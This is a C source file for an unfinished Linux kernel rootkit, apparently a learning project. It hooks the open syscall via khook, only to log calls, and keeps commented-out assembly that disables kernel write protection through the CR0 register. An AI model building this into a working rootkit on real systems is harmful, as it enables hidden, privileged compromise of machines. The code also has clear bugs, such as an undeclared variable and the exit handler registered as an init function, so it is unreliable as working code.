/**
 * @file	rootkit.c
 * @author	Aaron Lichtman, Arch Gupta  and Brandon Weidner
 * @brief	A rootkit. TODO: Expand description
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include "khook/engine.c"

//#include <linux/mutex.h> // Will likely need this for handling interrupts.

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aaron Lichtman");
MODULE_AUTHOR("Arch Gupta");
MODULE_AUTHOR("Brandon Weidner");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");

// Look into module_param() and MODULE_PARM_DESC for adding parameters

// TODO: Figure out if this is needed at all.
// /**
//  * Overwrite the 16th bit in the CR0 register to disable write protection.
//  */
// void disable_write_protection() {
//     unsigned long value;
//     asm volatile("mov %%cr0,%0" : "=r"(value));
//     if (value & 0x00010000) {
//         value &= ~0x00010000;
//                 asm volatile("mov %0,%%cr0" ::"r"(value));
//     }
// }

// Hooking open syscall?
KHOOK(open);
static int khook_open(const char *path, int oflag) {
    original = KHOOK_ORIGIN(open, path, oflag);
    printk("%s(%p, %08x) = %d\n", __func__, path, oflag, original);
    return original;
}

/**
 * Rootkit module initialization.
 */
static int rootkit_init(void) {
    printk(KERN_INFO "Initializing rootkit.\n");
    khook_init();
    return 0;
}

/**
 * Called at exit. All cleanup should be done here.
 */
static int rootkit_exit(void) {
    printk(KERN_INFO "Cleaning up rootkit.\n");
    khook_cleanup();
}

module_init(rootkit_init);
module_init(rootkit_exit);
